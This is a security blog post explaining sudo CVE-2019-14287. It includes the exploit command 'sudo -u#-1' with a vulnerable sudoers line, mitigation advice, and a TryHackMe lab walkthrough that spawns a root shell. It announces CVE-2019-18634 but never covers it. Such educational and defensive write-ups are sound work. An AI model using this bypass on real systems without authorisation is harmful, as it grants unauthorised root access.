---
title: "Sudo CVEs"
description: 
date: 2025-01-23T14:14:48Z
image: post/cvessudo.jpg
math: 
license: 
hidden: false
comments: true
draft: false
tags: ["Privesc","kernel","Linux","Sudo","CVE"]
categories: ["Linux-Privilege-Escalation","Sudo-Attacks"] 
---

# Sudo CVEs

In this article, we will discuss sudo CVEs, specifically `CVE-2019-14287` and `CVE-2019-18634`, and how they allow us to achieve sudo privilege escalation on Linux systems.  

## **CVE-2019-14287**

CVE-2019-14287 is a vulnerability in `sudo` that allows a user with restricted privileges to execute arbitrary commands as **root**, even if they are explicitly denied in the `sudoers` file. This occurs due to improper validation of the user ID (`UID`) when running commands.

---

## **Details of the Vulnerability**

1. **Affected Software**:
    - `sudo` versions prior to **1.8.28**.
    
1. **Vulnerability Description**:
    - When `sudo` is configured to allow a user to execute commands as any user **except root** using the `!ALL` directive in the `sudoers` file, the vulnerability allows bypassing this restriction.
    - The issue arises because `sudo` does not properly handle the `-1` or `4294967295` value for the `UID`. Internally, these values are interpreted as `0` (root).
2. **Exploitation**:
    - A user can exploit this by specifying `-u#-1` to execute a command as root, bypassing the restrictions.

---

## **Proof of Concept (PoC)**

### 1. Vulnerable Configuration in `/etc/sudoers`:

The following configuration denies a user (`exampleuser`) from executing commands as root:

```plaintext
exampleuser ALL=(ALL,!root) ALL
```

### 2. Exploit Command:

The attacker can bypass the restriction and run commands as root:

```bash
sudo -u#-1 id
```

### 3. Expected Output:

The command will execute as root (`UID=0`):

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

---

## **Impact**

- **Privilege Escalation**: The attacker gains root privileges, bypassing intended restrictions.
- **Severity**: High (CVSS Score: 7.8).

---

## **Mitigation**

1. **Update `sudo`**:
    
    - Upgrade to **sudo 1.8.28** or later, which properly validates `UID` values.
    
    ```bash
    sudo apt update && sudo apt install sudo
    ```
    
2. **Audit and Restrict sudoers Configuration**:
    
    - Ensure your `sudoers` file does not rely solely on `!root` for user restrictions.
3. **Monitor and Log sudo Usage**:
    
    - Use logs to monitor unusual activity involving `sudo`.

---

## Labs :

- https://tryhackme.com/r/room/sudovulnsbypass

### TryHackMe Lab 

Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.

First, we use the command `sudo -l` to check what commands we can execute with the current user.

![image alt text](post/cves1.png)


After running `sudo -l`, we see that we can run `/bin/bash` as another user except for root. Let’s exploit this vulnerability.

```shell
sudo -u#-1 /bin/bash
```

![image alt text](/my_image.png)


And just like that, we are now the root user! :

### **References**

- [MITRE CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)
